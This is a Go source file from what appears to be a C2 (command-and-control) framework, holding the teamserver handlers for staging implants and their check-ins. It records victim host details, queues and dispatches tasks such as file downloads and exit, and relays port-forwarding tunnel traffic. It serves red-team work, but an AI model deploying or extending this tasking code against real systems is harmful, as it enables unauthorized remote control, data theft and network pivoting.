package main

import (
	"context"
	"encoding/json"
	"time"

	"simplec2/pkg/bridge"
	"simplec2/pkg/logger"
	"simplec2/teamserver/commands"
	"simplec2/teamserver/data"

	"github.com/google/uuid"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/peer"
	"google.golang.org/grpc/status"
)

func (s *server) StageBeacon(ctx context.Context, in *bridge.StageBeaconRequest) (*bridge.StageBeaconResponse, error) {
	logger.Infof("Received StageBeacon from listener: %s", in.ListenerName)

	// Extract remote address from gRPC context
	var remoteAddr string
	p, ok := peer.FromContext(ctx)
	if ok {
		remoteAddr = p.Addr.String()
	}

	beacon := data.Beacon{
		BeaconID:        uuid.New().String(),
		Listener:        in.ListenerName,
		RemoteAddr:      remoteAddr,
		Status:          "active",
		FirstSeen:       time.Now(),
		LastSeen:        time.Now(),
		Sleep:           5, // Default sleep
		OS:              in.Metadata.Os,
		Arch:            in.Metadata.Arch,
		Username:        in.Metadata.Username,
		Hostname:        in.Metadata.Hostname,
		InternalIP:      in.Metadata.InternalIp,
		ProcessName:     in.Metadata.ProcessName,
		PID:             in.Metadata.Pid,
		IsHighIntegrity: in.Metadata.IsHighIntegrity,
	}

	if err := s.Store.CreateBeacon(&beacon); err != nil {
		logger.Errorf("Error saving beacon to database: %v", err)
		return nil, err
	}

	logger.Infof("New beacon with ID %s saved to database", beacon.BeaconID)

	// Broadcast the new beacon event via WebSocket
	event := struct {
		Type    string      `json:"type"`
		Payload data.Beacon `json:"payload"`
	}{
		Type:    "BEACON_NEW",
		Payload: beacon,
	}
	eventBytes, err := json.Marshal(event)
	if err != nil {
		logger.Errorf("Error marshalling new beacon event: %v", err)
	} else {
		s.Hub.Broadcast(eventBytes)
		logger.Infof("Broadcasted BEACON_NEW event for %s", beacon.BeaconID)
	}

	return &bridge.StageBeaconResponse{
		AssignedBeaconId: beacon.BeaconID,
	}, nil
}

func (s *server) CheckInBeacon(ctx context.Context, in *bridge.CheckInBeaconRequest) (*bridge.CheckInBeaconResponse, error) {
	logger.Infof("Received CheckInBeacon from beacon: %s", in.BeaconId)

	beacon, err := s.Store.GetBeacon(in.BeaconId)
	if err != nil {
		logger.Warnf("Beacon %s not found during check-in: %v. Assuming exited.", in.BeaconId, err)
		return nil, status.Errorf(codes.NotFound, "beacon not found")
	}

	// Update beacon's last seen time
	beacon.LastSeen = time.Now()

	// Process any outgoing tunnel messages from the agent
	if len(in.OutgoingTunnelData) > 0 {
		logger.Debugf("Beacon %s sent %d outgoing tunnel messages.", in.BeaconId, len(in.OutgoingTunnelData))
		s.PortFwdService.ProcessAgentOutgoingMessages(ctx, in.BeaconId, in.OutgoingTunnelData)
	}

	// If beacon is in 'exiting' state, send it an exit task.
	if beacon.Status == "exiting" {
		logger.Infof("Beacon %s is in 'exiting' state. Sending final exit task.", in.BeaconId)
		var grpcTasks []*bridge.Task
		grpcTasks = append(grpcTasks, &bridge.Task{
			TaskId:    uuid.New().String(),
			CommandId: 4, // CommandID for exit
			Arguments: nil,
		})
		s.Store.UpdateBeacon(beacon) // Save updated LastSeen
		return &bridge.CheckInBeaconResponse{
			Tasks: grpcTasks,
		}, nil
	}

	s.Store.UpdateBeacon(beacon)

	// Broadcast the check-in event via WebSocket
	checkinEvent := struct {
		Type    string `json:"type"`
		Payload struct {
			BeaconID string    `json:"beacon_id"`
			LastSeen time.Time `json:"last_seen"`
		} `json:"payload"`
	}{
		Type: "BEACON_CHECKIN",
		Payload: struct {
			BeaconID string    `json:"beacon_id"`
			LastSeen time.Time `json:"last_seen"`
		}{
			BeaconID: beacon.BeaconID,
			LastSeen: beacon.LastSeen,
		},
	}
	eventBytes, err := json.Marshal(checkinEvent)
	if err != nil {
		logger.Errorf("Error marshalling check-in event: %v", err)
	} else {
		s.Hub.Broadcast(eventBytes)
	}

	// Find queued tasks for this beacon
	var grpcTasks []*bridge.Task

	allTasks, err := s.Store.GetTasksByBeaconID(in.BeaconId, "queued")
	if err != nil {
		logger.Errorf("Error getting tasks for beacon %s: %v", in.BeaconId, err)
		return nil, err
	}

	for _, dbTask := range allTasks {
		if dbTask.Status != "queued" {
			continue
		}

		// 使用命令注册表获取转换器
		converter, ok := commands.Get(dbTask.Command)
		if !ok {
			logger.Warnf("Unknown command type for task %s: %s", dbTask.TaskID, dbTask.Command)
			continue
		}

		// 转换任务参数
		taskArgs, err := converter.Convert(&dbTask)
		if err != nil {
			logger.Errorf("Failed to convert task %s: %v", dbTask.TaskID, err)
			continue
		}

		// download 命令需要额外广播 FILE_DOWNLOAD_STARTED 事件
		if dbTask.Command == "download" && taskArgs != nil {
			var downloadArgs struct {
				Source      string `json:"source"`
				Destination string `json:"destination"`
				FileSize    int64  `json:"file_size"`
			}
			if err := json.Unmarshal(taskArgs, &downloadArgs); err == nil {
				startEvent := struct {
					Type    string      `json:"type"`
					Payload interface{} `json:"payload"`
				}{
					Type: "FILE_DOWNLOAD_STARTED",
					Payload: map[string]interface{}{
						"task_id":     dbTask.TaskID,
						"beacon_id":   dbTask.BeaconID,
						"source":      downloadArgs.Source,
						"destination": downloadArgs.Destination,
						"file_size":   downloadArgs.FileSize,
					},
				}
				if startEventBytes, err := json.Marshal(startEvent); err == nil {
					s.Hub.Broadcast(startEventBytes)
					logger.Debugf("Broadcasted FILE_DOWNLOAD_STARTED event for %s", downloadArgs.Source)
				}
			}
		}

		grpcTasks = append(grpcTasks, &bridge.Task{
			TaskId:    dbTask.TaskID,
			CommandId: converter.CommandID(),
			Arguments: taskArgs,
		})

		// Update task status to dispatched
		dbTask.Status = "dispatched"
		s.Store.UpdateTask(&dbTask)

		// Broadcast TASK_DISPATCHED event
		dispatchedEvent := struct {
			Type    string      `json:"type"`
			Payload interface{} `json:"payload"`
		}{
			Type:    "TASK_DISPATCHED",
			Payload: dbTask,
		}
		dispatchedEventBytes, err := json.Marshal(dispatchedEvent)
		if err != nil {
			logger.Errorf("Error marshalling TASK_DISPATCHED event: %v", err)
		} else {
			s.Hub.Broadcast(dispatchedEventBytes)
			logger.Debugf("Broadcasted TASK_DISPATCHED event for %s", dbTask.TaskID)
		}
	}

	// Retrieve any incoming tunnel messages for this agent
	incomingTunnelMsgs := s.PortFwdService.GetAgentIncomingMessages(ctx, in.BeaconId)

	return &bridge.CheckInBeaconResponse{
		Tasks:              grpcTasks,
		IncomingTunnelData: incomingTunnelMsgs,
		// NewSleep 字段不再使用，sleep间隔现在通过任务系统控制
	}, nil
}
